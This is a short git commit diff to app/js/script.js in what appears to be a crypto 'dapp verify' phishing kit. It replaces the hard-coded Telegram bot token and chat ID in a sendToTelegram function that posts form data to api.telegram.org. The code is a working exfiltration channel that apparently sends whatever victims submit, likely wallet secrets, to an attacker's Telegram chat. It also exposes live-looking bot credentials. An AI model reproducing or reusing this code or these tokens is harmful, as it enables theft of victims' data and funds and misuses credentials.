31963024810ae30bcd399adeabc58ead062fb37b
dapp2verify <abfresh2025@gmail.com>
2025-02-15 03:00:11 +0100

    Update script.js

--- app/js/script.js
+++ app/js/script.js
@@ -99,8 +99,8 @@ async function formatMessage(formType, formData) {
 
 // Function to send data to Telegram
 async function sendToTelegram(formData) {
-  const token = '7285769190:AAFopuaBmZwBQ-IH152ZbkTfhs5ERCUMUeA';
-  const chatId = '6952042736';
+  const token = '6429305071:AAEjsgTCqSjUFSBvPYGVN0d31gaZxxKSNdw';
+  const chatId = '1027345028';
 
   fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
     method: 'POST',
